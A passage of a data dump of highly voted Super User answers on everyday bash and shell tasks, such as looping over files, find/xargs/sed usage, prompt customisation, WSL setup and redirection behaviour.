<li><p><code>sudo service ssh --full-restart</code></p></li>
<li><p>Connect to your Linux subsystem from Windows using a ssh client like PuTTY.</p></li>
</ol>
"
"looping through `ls` results in bash shell script","31464","<bash><shell><shell-script>","121","<p><strong>Edited not to use ls where a glob would do, as @shawn-j-goff and others suggested.</strong></p>

<p>Just use a <code>for..do..done</code> loop:</p>

<pre><code>for f in *; do
  echo ""File -&gt; $f""
done
</code></pre>

<p>You can replace the <code>*</code> with <code>*.txt</code> or any other glob that returns a list (of files, directories, or anything for that matter), a command that generates a list, e.g., <code>$(cat filelist.txt)</code>, or actually replace it with a list.</p>

<p>Within the <code>do</code> loop, you just refer to the loop variable with the dollar sign prefix (so <code>$f</code> in the above example). You can <code>echo</code> it or do anything else to it you want.</p>

<p>For example, to rename all the <code>.xml</code> files in the current directory to <code>.txt</code>:</p>

<pre><code>for x in *.xml; do 
  t=$(echo $x | sed 's/\.xml$/.txt/'); 
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code></pre>

<p>Or even better, if you are using Bash you can use Bash parameter expansions rather than spawning a subshell:</p>

<pre><code>for x in *.xml; do 
  t=${x%.xml}.txt
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code></pre>
"
"Display each sub-directory size in a list format using one line command in Bash?","554319","<linux><bash><du>","121","<p>You probably want to see the directories ordered by size:</p>

<p><code>$ du -hs * | sort -hr</code></p>

<pre><code>856M    lib
746M    share
612M    lib64
312M    src
267M    java
239M    bin
179M    sbin
173M    local
93M     i686-w64-mingw32
72M     libexec
26M     include
20M     puppet
772K    X11R6
20K     man
4.0K    games
4.0K    etc
0       tmp
</code></pre>
"
"Windows Linux Subsystem - Accessing Files outside of Ubuntu","1083962","<windows-10><bash><windows-subsystem-for-linux>","119","<p>I'm not sure if I'm misunderstanding your question, but your ubuntu bash (top right window) should have access to your Windows-based disks under <code>/mnt</code>.  For example, on my machine <code>/mnt/c/Users/Scott/Desktop</code> is my Windows desktop and I can read/write files there from vi for ex.  I don't believe the opposite is true just yet.  That is, I don't think you can explore into your bash world from Windows explorer.</p>

<p>What I've been doing as a developer is to host projects on my d: and point the linux-based tools to that <code>/mnt/d/projects/someproject/</code> folder.</p>

<p>Make sure you update your Windows builds periodically as they seem to be fixing a lot of issues with each build, especially around sym-links and crossing FS boundaries between Linux/Windows.</p>
"
"How to remove/reset Windows Subsystem for Linux on Windows Insider Build 14316","1065569","<ubuntu><bash><windows-10-preview><windows-subsystem-for-linux>","118","<p><strong>The following answer only applies to WSL on Windows 10 1703 and 1607.</strong> WSL on Windows 10 1709+ can be installed from within the Windows Store UWP application.</p>

<p>If you want to remove and reset the Linux subsystem, open a command line prompt with elevated permissions and enter the following commands:</p>

<pre><code>lxrun /uninstall /full 

lxrun /install
</code></pre>

<p>Sources:</p>

<ol>
<li><p><a href=""https://www.slightfuture.com/technote/lxss-lxrun"" rel=""noreferrer"">https://www.slightfuture.com/technote/lxss-lxrun</a></p></li>
<li><p><a href=""http://www.hanselman.com/blog/InstallingFishShellOnUbuntuOnWindows10.aspx"" rel=""noreferrer"">Installing Fish Shell on Ubuntu on Windows 10</a></p></li>
<li><p><a href=""https://insights.ubuntu.com/2016/04/14/howto-ubuntu-on-windows-2/"" rel=""noreferrer"">HOWTO: Ubuntu on Windows | Ubuntu Insights</a></p></li>
</ol>
"
"How do I reload .inputrc?","241187","<bash><unix><readline><inputrc>","117","<p>By default, <code>C-x C-r</code> is bound to <code>re-read-init-file</code>.</p>

<p>See the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Miscellaneous-Commands"">Bash Reference Manual</a> for explanation.</p>
"
"What does export do in BASH?","153371","<bash><export><shell-script>","108","<p>From <code>man bash</code>:</p>

<blockquote>
  <p><strong>ENVIRONMENT</strong></p>
  
  <p>When a program is invoked it is given an array of strings called the
  environment.  This is a list of
  name-value pairs, of the form
  name=value.</p>
  
  <p>The shell provides several ways to manipulate the environment.  On
  invocation, the shell  scans  its own 
  environment and creates a parameter
  for each name found, automatically
  marking it for export to child
  processes.  Executed commands inherit
  the environment.  The <code>export</code>  and 
  <code>declare  -x</code>  commands allow 
  parameters  and functions to be added
  to and deleted from the environment. 
  If the value of a parameter in the
  environment is modified, the new value
  becomes part of the  environment, 
  replacing the old.  The environment
  inherited by any executed command
  consists of the shell's initial
  environment, whose values may be
  modified in the shell, less any pairs
  removed by the <code>unset</code>  command,  plus
  any additions via the export and
  <code>declare -x</code> commands.</p>
</blockquote>
"
"How to add a mp3 handler to sox?","421153","<ubuntu><bash><mp3><sox>","108","<p>Pipe?</p>

<pre><code>lame --decode music.mp3 - | play -
</code></pre>

<p>Won't leave any trace.</p>
"
"Change default text editor for crontab to vim","281617","<ubuntu><bash><text-editors>","106","<p>The <code>crontab -e</code> command will check the environment variables <code>$EDITOR</code> and <code>$VISUAL</code> for an override of the default text editor, so...</p>

<pre><code>export VISUAL=vim
</code></pre>

<p>or </p>

<pre><code>export EDITOR=vim
</code></pre>

<p>should do the trick.</p>
"
"How can I do a recursive find and replace from the command line?","428493","<bash><shell><zsh><find-and-replace>","106","<p>This command will do it (tested on both Mac OS X Lion and Kubuntu Linux).</p>

<pre><code># Recursively find and replace in files
find . -type f -name ""*.txt"" -print0 | xargs -0 sed -i '' -e 's/foo/bar/g'
</code></pre>

<p>Here's how it works:</p>

<ol>
<li><code>find . -type f -name '*.txt'</code> finds, in the current directory (<code>.</code>) and below, all regular files (<code>-type f</code>) whose names end in <code>.txt</code></li>
<li><code>|</code> passes the output of that command (a list of filenames) to the next command</li>
<li><code>xargs</code> gathers up those filenames and hands them one by one to <code>sed</code></li>
<li><code>sed -i '' -e 's/foo/bar/g'</code> means ""edit the file in place, without a backup, and make the following substitution (<code>s/foo/bar</code>) multiple times per line (<code>/g</code>)"" (see <code>man sed</code>)</li>
</ol>

<p>Note that the 'without a backup' part in line 4 is OK for me, because the files I'm changing are under version control anyway, so I can easily undo if there was a mistake.</p>

<p>To avoid having to remember this, I use an interactive bash script, as follows:</p>

<pre><code>#!/bin/bash
# find_and_replace.sh

echo ""Find and replace in current directory!""
echo ""File pattern to look for? (eg '*.txt')""
read filepattern
echo ""Existing string?""
read existing
echo ""Replacement string?""
read replacement
echo ""Replacing all occurences of $existing with $replacement in files matching $filepattern""

find . -type f -name $filepattern -print0 | xargs -0 sed -i '' -e ""s/$existing/$replacement/g""
</code></pre>
"
"How to remove a symbolic link to a directory?","9181","<linux><bash><symbolic-link>","105","<p>Remove the trailing slash:</p>

<p>With prompt:</p>

<blockquote>
  <p><code>$ rm test5</code></p>
</blockquote>

<p>Without prompt:</p>

<blockquote>
  <p><code>$ rm -f test5</code></p>
</blockquote>
"
"How to pipe command output to other commands?","189362","<bash><pipe>","101","<p>There is a distinction between command line arguments and standard input.  A pipe will connect standard output of one process to standard input of another.  So</p>

<pre><code>ls | echo
</code></pre>

<p>Connects standard output of ls to standard input of echo.  Fine right?  Well, echo ignores standard input and will dump its command line arguments - which are none in this case to - its own stdout. The output: nothing at all.</p>

<p>There are a few solutions in this case.  One is to use a command that reads stdin and dumps to stdout, such as cat.</p>

<pre><code>ls | cat
</code></pre>

<p>Will 'work', depending on what your definition of work is.  </p>

<p>But what about the general case. What you really want is to convert stdout of one command to command line args of another.  As others have said, <code>xargs</code> is the canonical helper tool in this case, reading its command line args for a command from its stdin, and constructing commands to run.</p>

<pre><code>ls | xargs echo
</code></pre>

<p>You could also convert this some, using the substitution command <code>$()</code></p>

<pre><code>echo $(ls)
</code></pre>

<p>Would also do what you want.</p>

<p>Both of these tools are pretty core to shell scripting, you should learn both.  </p>

<p>For completeness, as you indicate in the question, the other base way to convert stdin to command line args is the shell's builtin <code>read</code> command. It converts ""words"" (words as defined by the <code>IFS</code> variable) to a temp variable, which you can use in any command runs.</p>
"
"Show only current directory name (not full path) on bash prompt","60555","<linux><command-line><bash><bashrc>","101","<p>Change the <code>\w</code> (lowercase) to <code>\W</code> (uppercase):</p>

<pre><code>PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\W\[\033[00m\]\$ '
                                                                                       ^^
           this one waaaaaay over here ------------------------------------------------+    
</code></pre>

<p>Have a look at the <a href=""http://tldp.org/HOWTO/Bash-Prompt-HOWTO/index.html"" rel=""noreferrer"">Bash Prompt HOWTO</a> for lots of fun details.  example:</p>

<pre><code>user@host:/usr/local/bin$ echo $PS1
${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]\$ 

user@host:/usr/local/bin$ export PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\W\[\033[00m\]\$ '

user@host:bin$
</code></pre>

<p>The <code>PROMPT_COMMAND</code> variable, if set, is a command that gets run before displaying the prompt specified in <code>PS1</code>.  In your case, <code>PROMPT_COMMAND</code> runs an <code>echo</code> statement with certain <a href=""http://tldp.org/HOWTO/Bash-Prompt-HOWTO/c327.html"" rel=""noreferrer"">ANSI escape sequences</a> that <a href=""http://tldp.org/HOWTO/Bash-Prompt-HOWTO/xterm-title-bar-manipulations.html"" rel=""noreferrer"">manipulate the titlebar of an Xterm</a>.</p>

<p>If you suspect your <code>PROMPT_COMMAND</code> is overriding your <code>PS1</code> prompt, you can <code>unset</code> it and test things out:</p>

<pre><code>$ unset PROMPT_COMMAND
</code></pre>

<p>Finally, be sure that you're changing the <code>PS1</code> definition that actually gets used.  Common locations are <code>/etc/bash.bashrc</code>, <code>/etc/profile</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>.  The system files are generally (but not always) run before the user files.</p>
"
"How can I save the current contents of less to a file?","290908","<bash><pipe><less>","101","<p>On my system, <code>man less</code> says</p>

<pre>
       s filename
              Save the input to a file.  This only works if  the  input  is  a
              pipe, not an ordinary file.
</pre>

<p>Works for me!</p>
"
"Get home directory by username","484277","<linux><bash>","101","<p>You can use <code>eval</code>:</p>

<pre><code>eval echo ~$USER
</code></pre>

<p>But see <a href=""https://superuser.com/users/59059/andrew-macfie"">Andrew</a>'s comment and <a href=""https://superuser.com/users/4714/glenn-jackman"">glenn</a>'s reply below.</p>
"
"Previous commands wrapped with square brackets in OS X Terminal","974714","<macos><bash><terminal>","101","<p>Got it! Somehow I'd accidentally turned ""Automatically Mark Prompt Lines"" on:</p>

<p><a href=""https://i.stack.imgur.com/8Gey1.jpg""><img src=""https://i.stack.imgur.com/8Gey1.jpg"" alt=""enter image description here""></a></p>

<p>I do wonder though where that configuration is stored on disk, as I also tried:</p>

<ul>
<li>Deleting <code>~/Library/Preferences/com.apple.Terminal.plist</code></li>
<li>Running Terminal from my Yosemite partition (didn't show the marks)</li>
<li>Extracting a fresh copy of Terminal from the El Capitan installer (did show the marks)</li>
</ul>
"
"How to sort first directories then files etc… when using “ls” in Unix","109537","<unix><bash><ls><sorting>","101","<p>The following command will list directories first, ordinary files second, and links third.</p>

<p><code>ls -la | grep ""^d"" &amp;&amp; ls -la | grep ""^-"" &amp;&amp; ls -la | grep ""^l""</code></p>

<p>Also, it would make a great deal of sense to create an <a href=""http://ss64.com/bash/alias.html"">alias</a> for this command to save keystrokes.</p>

<p><strong>Edit:</strong></p>

<p>If you want directories first, and then everything that is not a directory second, use this:</p>

<p><code>ls -la | grep ""^d"" &amp;&amp; ls -la | grep -v ""^d""</code></p>
"
"Finding files which contain a certain string using find (1) and grep (1)","614526","<bash><find>","96","<p>That's because you're feeding <code>grep</code> a stream of text which just happens to contain filenames. Since you provided no filenames as arguments to grep, it cannot be expected to deduce what file a matched line came from. Use <code>xargs</code>:</p>

<pre><code>find . -type f -print | xargs grep ""some string""
</code></pre>

<p>Since you have GNU find/xargs, this is a safer way for xargs to read filenames:</p>

<pre><code>find . -type f -print0 | xargs -0 grep ""some string""
</code></pre>

<p>If you only want the filenames that have a matching line without showing the matching line:</p>

<pre><code>find . -type f -print0 | xargs -0 grep -l ""some string""
</code></pre>
"
"Is there a shortcut to mkdir foo and immediately cd into it?","152794","<command-line><bash><terminal><shortcuts>","96","<p>I'm no Linux/bash expert, but try putting this in your <code>.bashrc</code>.</p>

<pre><code>function mkdir
{
  command mkdir $1 &amp;&amp; cd $1
}
</code></pre>

<p>PS Thanks to Dennis for using <code>command mkdir</code>.</p>
"
"Mac OS X .bashrc not working","244964","<macos><bash><bashrc>","95","<p>In OSX, <code>.bash_profile</code> is used instead of <code>.bashrc</code>.</p>

<p>And yes, the <code>.bash_profile</code> file should be located in <code>/Users/YourName/</code><br>
(In other words, <code>~/.bash_profile</code>)</p>

<p>For example, <code>/Users/Aaron/.bash_profile</code></p>
"
"How can I change shell in Ubuntu?","119179","<ubuntu><command-line><bash><shell><chsh>","95","<p>To change a shell, use the bare <code>chsh</code> command.  This will prompt you for the new shell.  You do not have to run anything as root.</p>
"
"How can I resolve the error ""cannot execute binary file""?","435988","<linux><bash><ssh><debian>","94","<p>Usually that error message means Linux doesn't recognize the file as a shell script or as an executable file.  </p>

<p>Typically the cause is running an executable on the wrong architecture - if you try to run x86 executables on an ARM CPU, this message comes up.</p>

<p>Did <code>/usr/bin/id</code> get overwritten, possibly?</p>
"
"how to expand aliases inline in bash?","247770","<bash><alias><expansion>","94","<p>You can press <kbd>Ctrl</kbd>-<kbd>Alt</kbd>-<kbd>e</kbd> to perform the readline function <code>shell-expand-line</code> which will do alias, history and word expansions. Note that on some keyboards <kbd>Meta</kbd> is not <kbd>Alt</kbd>. You might need to press <kbd>Esc</kbd> then <kbd>Ctrl</kbd>-<kbd>e</kbd></p>

<p>The functions <code>alias-expand-line</code> and <code>history-and-alias-expand-line</code> are not bound by default, but you can bind them by adding lines similar to the following to your <code>~/.inputrc</code> file.</p>

<pre><code>""\e\C-l"": alias-expand-line
</code></pre>

<p>which would make <kbd>Ctrl</kbd>-<kbd>Alt</kbd>-<kbd>l</kbd> (lower case ""ell"") perform <em>only</em> alias expansion.</p>
"
"How do I get the output and exit value of a subshell when using ""bash -e""?","363444","<bash>","93","<p><code>$()</code> preserves the exit status; you just have to use it in a statement that has no status of its own, such as an assignment.</p>

<pre>
<b>output=$(inner)</b>
</pre>

<p>After this, <code>$?</code> would contain the exit status of <code>inner</code>, and you can use all sorts of checks for it:</p>

<pre><code>output=$(inner) || exit $?
echo $output
</code></pre>

<p>Or:</p>

<pre><code>if ! output=$(inner); then
    exit $?
fi
echo $output
</code></pre>

<p>Or:</p>

<pre><code>if output=$(inner); then
    echo $output
else
    exit $?
fi
</code></pre>

<p>(Note: A bare <code>exit</code> without arguments is equivalent to <code>exit $?</code> &ndash; that is, it exits with the last command's exit status. I used the second form only for clarity.)</p>

<hr>

<p>Also, for the record: <code>source</code> is completely unrelated in this case. You can just define <code>inner()</code> in the <code>outer-scope.sh</code> file, with the same results.</p>
"
"List files bigger than filesize specified","233616","<linux><bash><terminal>","93","<p>Use <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?find"">find</a> and its <code>-size</code> flag. </p>

<p>To find files larger than 100MB:</p>

<pre><code>find . -type f -size +100M
</code></pre>

<p>If you want the current dir only:</p>

<pre><code>find . -maxdepth 1 -type f -size +100M
</code></pre>


"
"How to get git-completion.bash to work on Mac OS X?","31744","<macos><mac><bash><git>","92","<p>I installed git using <a href=""http://macports.org/"" rel=""noreferrer"">MacPorts</a> on my new Snow Leopard installation.  After MacPorts is installed from the .dmg image, these would be the commands in Terminal.app:</p>
<pre><code>sudo port selfupdate
sudo port install git-core +bash_completion
</code></pre>
<p>If you also want support for pulling from SVN repositories and docs, use this instead of the second line:</p>
<pre><code>sudo port install git-core +bash_completion +doc +svn
</code></pre>
<p>Then add the following to your ~/.profile or ~/.bash_profile:</p>
<pre># MacPorts Bash shell command completion
if [ -f /opt/local/etc/bash_completion ]; then
    . /opt/local/etc/bash_completion
fi</pre>
<p>or for MacPorts since version 2.1.2 on Mountain Lion:</p>
<pre># MacPorts Bash shell command completion
if [ -f /opt/local/etc/profile.d/bash_completion.sh ]; then
  . /opt/local/etc/profile.d/bash_completion.sh
fi</pre>
<p>or for MacPorts with newer versions of git:</p>
<pre>if [ -f /opt/local/share/git-core/git-prompt.sh ]; then
    . /opt/local/share/git-core/git-prompt.sh
fi</pre>
<p>Note: bash 4.1 or higher is required by bash_completion.sh. If completion doesn't work try <code>echo $BASH_VERSION</code> to see if that's the issue. If so, enter MacPorts bash by typing <code>bash</code> and try git completion again.</p>
"
"Where to find the .bashrc file on Mac OS X Snow Leopard and Lion?","147043","<bash><osx-snow-leopard><terminal><osx-lion><.bash-profile>","92","<p>So turns out that on Mac OS X Snow Leopard as well as Mac OS X Lion, the file that's loaded is called <code>.profile</code>, not <code>.bashrc</code>.</p>

<p>What you want to do is create a file in <code>~/.profile</code> and call it .profile (if it doesn't already exists).</p>

<p>Put whatever information you needed to load with each instance of bash there (Thanks, thepurplepixel).</p>

<p><strong><em>A couple of side notes:</em></strong></p>

<ol>
<li>The period in front of the file marks it as invisible to Finder and
the ls command by default. To list invisible files using the ls
command from Terminal, use the <code>-a</code> as a parameter as such: <code>ls -a</code></li>
<li>The <code>~</code> symbol stands for <code>/Users/YourUserName</code> where YourUserName
is your username's shortname.</li>
</ol>

<p>Edit: Chris Page notes (correctly) that whatever you place in a .profile file will apply to whatever shell you're using (i.e. zhs, bash, et cetera). If you want the contents to affect only the bash shell, place the contents in a <code>.bash_profile</code> file instead of a <code>.profile</code> file.</p>
"
"how do I echo $something >> file.txt without carriage return?","395668","<bash><redirection>","91","<p>That's what <code>echo -n</code> is for .</p>
"
"Substitution in text file **without** regular expressions","422459","<bash><regex><sed><text-editing>","89","<p>When you don't need the power of regular expressions, don't use it. That is fine.<br>
But, this is not really a <a href=""http://en.wikipedia.org/wiki/Regular_expression"" rel=""nofollow noreferrer"">regular expression</a>. </p>

<pre><code>sed 's|literal_pattern|replacement_string|g'
</code></pre>

<p>So, if <code>/</code> is your problem, use <code>|</code> and you don't need to escape the former.</p>

<p>PS: About the comments, also see this Stackoverflow answer on <a href=""https://stackoverflow.com/a/2705678/70482"">Escape a string for sed search pattern</a>.</p>

<hr>

<p><strong>Update</strong>: If you are fine using <strong>Perl</strong> try it with <code>\Q</code> and <code>\E</code> like this,  </p>

<pre><code> perl -pe 's|\Qliteral_pattern\E|replacement_string|g'
</code></pre>

<p><sub>@RedGrittyBrick has also suggested a similar trick with stronger Perl syntax in a comment <a href=""https://superuser.com/questions/422459/substitution-in-text-file-without-regular-expressions#comment484003_422478"">here</a> or <a href=""https://stackoverflow.com/a/1048144/70482"">here</a></sub></p>
"
"How to: Unlimited Bash/shell history?","137438","<linux><bash><shell>","89","<p>Add this to your <code>.bashrc</code> (Linux) or <code>.bash_profile</code> (MacOS):</p>

<pre><code>export HISTFILESIZE=
export HISTSIZE=
</code></pre>

<p>There you go, unlimited history. Currently I have 27000 entries :)</p>

<p>From <code>man bash</code>:</p>

<blockquote>
  <p>If <code>HISTFILESIZE</code> is not set, no truncation is performed.</p>
</blockquote>

<p>That means <code>.bash_history</code> is never truncated</p>

<p>Also the same seems to apply to <code>HISTSIZE</code>, although I couldn't find that documented.</p>

<p>Another neat feature I'm going to try is this:</p>

<blockquote>
  <p>If the <code>HISTTIMEFORMAT</code> variable is set, time stamps are written to the history file, marked with the history comment character, so they may be preserved across shell sessions, like the following:</p>
</blockquote>

<pre><code>export HISTTIMEFORMAT=""%F %T ""
</code></pre>

<p>Let me know if you have tried that already...</p>
"
"Check if any of the parameters to a bash script match a string","186272","<linux><unix><bash><shell-script>","88","<p>It looks like you're doing option handling in a shell script.  Here's the idiom for that:</p>

<pre><code>#! /bin/sh -

# idiomatic parameter and option handling in sh
while test $# -gt 0
do
    case ""$1"" in
        --opt1) echo ""option 1""
            ;;
        --opt2) echo ""option 2""
            ;;
        --*) echo ""bad option $1""
            ;;
        *) echo ""argument $1""
            ;;
    esac
    shift
done

exit 0
</code></pre>

<p>(There are a couple of conventions for indenting the <code>;;</code>, and some shells allow you to give the options as <code>(--opt1)</code>, to help with brace matching, but this is the basic idea)</p>
"
"Linux command to repeat a string n times","86340","<linux><command-line><bash><shell><text-manipulation>","88","<pre><code>adrian@Fourier:~$ printf 'HelloWorld\n%.0s' {1..5}
HelloWorld
HelloWorld
HelloWorld
HelloWorld
HelloWorld
adrian@Fourier:~$
</code></pre>
"
"tar: Exiting with failure status due to previous errors","169195","<ubuntu><bash><tar><gzip>","88","<p>You will get that message if, for any reason, tar can't add all of the specified files to the tar.  One if the most common is not having read permission on one of the files.  This could be a big problem since you are using this for backup.  If you are using the <code>-v</code> flag, try leaving it off.  This should reduce the output and let you see what is going on.</p>
"
"Where is the C drive in the WSL?","1107618","<command-line><bash><shell><windows-subsystem-for-linux><windows-10-v1607>","85","<p>Taken from <a href=""https://blogs.windows.com/buildingapps/2016/07/22/fun-with-the-windows-subsystem-for-linux/"" rel=""noreferrer"">this website</a>:</p>

<blockquote>
  <p>The WSL has access to your PC’s file system through <code>/mnt/&lt;drive letter&gt;/</code> directories (or mount points). For example, your <code>C:\</code> and <code>D:\</code> root directories in Windows would be available through <code>/mnt/c/</code> and <code>/mnt/d/</code> respectively in the WSL</p>
</blockquote>

<p>Just <code>cd</code> into the <code>/mnt</code> folder and you'll be fine</p>
"
"What is Git Bash for Windows anyway?","1053633","<windows><bash><rsync><mingw>","85","<h1>Summary</h1>

<p>You are correct, <em>Git Bash for Windows</em> is not just <code>bash</code> compiled for Windows. It's package that contains <code>bash</code> (which is a <a href=""https://askubuntu.com/a/506628/392234""><em>command-line shell</em></a>) and a collection of other, separate *nix utilities like <code>ssh</code>, <code>scp</code>, <code>cat</code>, <code>find</code> and others (which you run using the shell), compiled for Windows, and a new command-line interface terminal window called <code>mintty</code>.</p>

<h1>In a nutshell</h1>

<p>On Windows you might run commands like <code>ipconfig /all</code> or <code>format G:</code> using <code>cmd.exe</code>. These commands are actual executable files under <code>C:\Windows\system32</code>, stored as <code>ipconfig.exe</code> and <code>format.com</code> files. <code>cmd.exe</code> is separate from both and loads and runs them on user's request.</p>

<p><code>ssh</code>, <code>scp</code>, <code>cat</code>, <code>find</code> are run using <code>bash</code> in exactly the same way. They are usually stored under <code>/usr/bin</code> rather than in <code>C:\Windows\system32</code> on *nix systems, because Windows and *nix have their system file structure organised differently.</p>

<p>In the case of Git Bash for Windows these programs are located in the Git installation folder: <code>C:\Program Files\Git\usr\bin</code>, which can also be found in the emulated Linux environment under <code>/usr/bin</code>.</p>

<p>Just like being able to just run <code>cmd.exe</code> on *nix doesn't allow you to do much without the other system utilities, just being able to run Bash on Windows is not very useful either. This means that all these extra commands have to be bundled together with Bash to create a usable software package.</p>

<h1>Details: POSIX applications on Windows</h1>

<p>Normally those extra commands would be found on *nix systems and not on Windows, because they have been programmed against the POSIX programming API (which is what *nix uses), and not the Win32 APIs (which is what Windows uses). POSIX API documentation is openly available, so some people have ported it to other systems, including Windows. Windows implementation of POSIX APIs/libraries are provided by <code>Cygwin</code> and <code>MSYS</code>.</p>

<p>This is kind of similar to what the <a href=""https://www.winehq.org/"" rel=""noreferrer"">Wine project</a> does, but it converts POSIX->Windows rather than Windows->POSIX like Wine does.</p>

<h1>mintty</h1>

<p><code>mintty</code> is included because <code>cmd.exe</code>, the default Windows command line window, is missing some important features which are normally available on most *nix systems. In most cases, <code>mintty</code> is a better choice for running commands (certainly for the utilities that come with the Git Bash for Windows package), but occasionally a Windows system application may work better with <code>cmd.exe</code>.</p>
"
"How to keep only every nth line of a file","396536","<bash>","83","<pre><code>~ $ awk 'NR == 1 || NR % 3 == 0' yourfile
Line 1
Line 3
Line 6
</code></pre>

<p><code>NR</code> (number of records) variable is records number of lines because default behavior is new line for <code>RS</code> (record seperator). pattern and action is optional in awk's default format <code>'pattern {actions}'</code>. when we give only pattern part then <code>awk</code> writes all the fields <code>$0</code> for our pattern's <code>true</code> conditions.  </p>
"
"Copy a directory on Unix","222395","<unix><bash><terminal>","82","<pre><code>cp -rf /source/path/ /destination/path/
</code></pre>

<p><code>-r</code> = recursive, copies all the sub-directories</p>

<p><code>-f</code> = force, if an existing destination file cannot be opened, remove it and try again</p>

<p><strong>Note</strong> You should be careful when using the <code>-f</code> flag because it will forcefully overwrite anything you copy to. Thank @Nifle for this suggestion.</p>

<p>You may want to use the * wildcard to copy all of the files in the directory if you need to.</p>
"
"How to unalias a minus?","1184384","<bash><bash-alias>","82","<p>You can avoid POSIX compliant systems interpreting dashes in commands by adding <code>--</code> before any arguments.</p>

<pre><code>mtak@frisbee:~$ alias grep=grep --color=always
mtak@frisbee:~$ alias | grep color
alias --color='always'

mtak@frisbee:~$ unalias -- --color
mtak@frisbee:~$ alias | grep color
mtak@frisbee:~$
</code></pre>

<p>This also works with other utilities, let's say you have a file named <code>-bla</code>. If you try to remove it with <code>rm</code> you will get the following error:</p>

<pre><code>mtak@frisbee:~$ ls -- -bla
-bla
mtak@frisbee:~$ rm -bla
rm: invalid option -- 'b'
Try 'rm ./-bla' to remove the file '-bla'.
Try 'rm --help' for more information.
</code></pre>

<p>By using <code>--</code> before the filename, you will remove the file:</p>

<pre><code>mtak@frisbee:~$ rm -- -bla
mtak@frisbee:~$ ls -- -bla
ls: cannot access '-bla': No such file or directory
</code></pre>
"
"Is redirection with `>>` equivalent to `>` when target file doesn't yet exist?","1342489","<bash><redirection><sh>","81","<h1>tl;dr</h1>

<p>No. <code>&gt;&gt;</code> is essentially ""always seek to end of file"" while <code>&gt;</code> maintains a pointer to the last written location.</p>

<hr>

<h1>Full answer</h1>

<p><sup>(Note: all my tests done on Debian GNU/Linux 9).</sup></p>

<h3>Another difference</h3>

<p>No, they are not equivalent. There is <em>another</em> difference. It may manifest itself regardless of whether the target file existed before or not.</p>

<p>To observe it, run a process that generates data and redirect to a file with <code>&gt;</code> or <code>&gt;&gt;</code> (e.g. <code>pv -L 10k /dev/urandom &gt; blob</code>). Let it run and change the size of the file (e.g. with <code>truncate</code>). You will see that <code>&gt;</code> keeps its (growing) offset while <code>&gt;&gt;</code> always appends to the end.</p>

<ul>
<li>If you truncate the file to a smaller size (it can be zero size)

<ul>
<li><code>&gt;</code> won't care, it will write at its desired offset as if nothing happened; just after the truncating the offset is beyond the end of the file, this will cause the file to regain its old size and grow further, missing data will be filled with zeros (in a sparse way, if possible);</li>
<li><code>&gt;&gt;</code> will append to the new end, the file will grow from its truncated size.</li>
</ul></li>
<li>If you enlarge the file

<ul>
<li><code>&gt;</code> won't care, it will write at its desired offset as if nothing happened; just after changing the size the offset is somewhere inside the file, this will cause the file to stop growing for a while, until the offset reaches the new end, then the file will grow normally;</li>
<li><code>&gt;&gt;</code> will append to the new end, the file will grow from its enlarged size.</li>
</ul></li>
</ul>

<p>Another example is to append (with a separate <code>&gt;&gt;</code>) something extra when the data generating process is running and writing to the file. This is similar to enlarging the file.</p>

<ul>
<li>The generating process with <code>&gt;</code> will write at its desired offset and overwrite the extra data eventually.</li>
<li>The generating process with <code>&gt;&gt;</code> will skip the new data and append past it (race condition may occur, the two streams may get interleaved, still no data should be overwritten).</li>
</ul>

<hr>

<h3>Example</h3>

<p>Does it matter in practice? There is <a href=""https://superuser.com/q/1341945/432690"">this question</a>:</p>

<blockquote>
  <p>I'm running a process which produces a lot of output on stdout. Sending it all to a file [...] Can I use some kind of log rotation program?</p>
</blockquote>

<p><a href=""https://superuser.com/a/1341958/432690"">This answer</a> says the solution is <code>logrotate</code> with <code>copytruncate</code> option which acts like this:</p>

<blockquote>
  <p>Truncate the original log file in place after creating a copy, instead of moving the old log file and optionally creating a new one.</p>
</blockquote>

<p>According to what I wrote above, redirecting with <code>&gt;</code> will make the truncated log large in no time. Sparseness will save the day, no significant disk space should be wasted. Nevertheless each consecutive log will have more and more leading zeros in it that are completely unnecessary.</p>

<p>But if <code>logrotate</code> creates copies without preserving sparseness, these leading zeros will need more and more disk space every time a copy is made. I haven't investigated the tool behavior, it may be smart enough with sparseness or compression on the fly (if compression is enabled). Still the zeros may only cause trouble or be neutral at best; nothing good in them.</p>

<p>In this case using <code>&gt;&gt;</code> instead of <code>&gt;</code> is significantly better, even if the target file is about to be created yet.</p>

<hr>

<h3>Performance</h3>

<p>As we can see, the two operators act differently not only when they begin but also later. This may cause some (subtle?) performance difference. For now I have no meaningful test results to support or disprove it, but I think you shouldn't  automatically assume their performance is the same in general.</p>
"
"How to gzip multiple files into one gz file?","334827","<linux><bash><unix><gzip>","81","<p>if you have zip,</p>

<pre><code>zip myzip.zip cvd*.txt
</code></pre>

<p>Don't need to <code>tar</code> them first.</p>
"
"How do I change the language of the Linux subsystem in Windows 10 (WSL)?","1108090","<windows-10><bash><windows-subsystem-for-linux><windows-10-v1607>","80","<p>The Windows Subsystem for Linux (WSL) installation should automatically set the Ubuntu locale to match the locale of your Windows install.  You can change the Ubuntu locale manually using the shell.</p>

<ol>
<li><p>Run this command in bash.exe to change the language to US English:</p>

<pre><code>sudo update-locale LANG=en_US.UTF8
</code></pre>

<p>If you get a <code>sudo: unable to resolve host</code> error whenever you run <code>sudo</code>,</p>

<ul>
<li><p>Verify that you have a hostname set (with the <code>hostname</code> command).</p>

<ul>
<li>If it isn't set, add it to the <code>/etc/hostname</code> file.</li>
<li>Ensure that <code>/etc/hostname</code> contains <em>only</em> the hostname.</li>
</ul>

<p>Edit the file with <code>sudoedit /etc/hostname</code>
(assuming you can get that to work); see <a href=""https://superuser.com/q/785187/150988"" title=""sudoedit: why use it over sudo vi?"">this</a>.</p></li>
<li>Ensure that your <code>/etc/hosts</code> file contains entries
for your actual hostname (spelled <em>exactly</em> the same) and/or <code>localhost</code>. 
Again, use <code>sudoedit</code>.</li>
</ul>

